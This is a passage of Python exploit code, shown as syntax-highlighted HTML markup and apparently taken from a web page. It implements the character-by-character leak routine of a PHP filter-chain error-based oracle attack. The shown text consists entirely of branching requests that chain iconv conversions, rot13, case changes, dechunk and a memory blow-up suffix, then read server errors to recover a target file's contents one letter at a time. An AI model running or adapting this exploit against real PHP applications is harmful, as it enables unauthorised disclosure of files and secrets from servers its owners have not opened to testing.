class="token string">'*'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># f</span><span class="token keyword">return</span> <span class="token string">'f'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># F</span><span class="token keyword">return</span> <span class="token string">'F'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># n-s N-S</span><span class="token keyword">if</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># n-r</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'rqpon'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># N-R</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|'</span></span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'RQPON'</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># s</span><span class="token keyword">return</span> <span class="token string">'s'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># S</span><span class="token keyword">return</span> <span class="token string">'S'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># i j k</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'k'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'j'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'i'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># I J K</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'K'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'J'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'I'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># v w x</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'x'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'w'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'v'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># V W X</span><span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'X'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'W'</span><span class="token keyword">elif</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>be<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>rot1<span class="token punctuation">&#125;</span></span><span class="token string">|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'V'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># Z</span><span class="token keyword">return</span> <span class="token string">'Z'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># z</span><span class="token keyword">return</span> <span class="token string">'z'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># M</span><span class="token keyword">return</span> <span class="token string">'M'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># m</span><span class="token keyword">return</span> <span class="token string">'m'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># y</span><span class="token keyword">return</span> <span class="token string">'y'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># Y</span><span class="token keyword">return</span> <span class="token string">'Y'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># l</span><span class="token keyword">return</span> <span class="token string">'l'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># L</span><span class="token keyword">return</span> <span class="token string">'L'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># h</span><span class="token keyword">return</span> <span class="token string">'h'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># H</span><span class="token keyword">return</span> <span class="token string">'H'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># u</span><span class="token keyword">return</span> <span class="token string">'u'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># U</span><span class="token keyword">return</span> <span class="token string">'U'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token 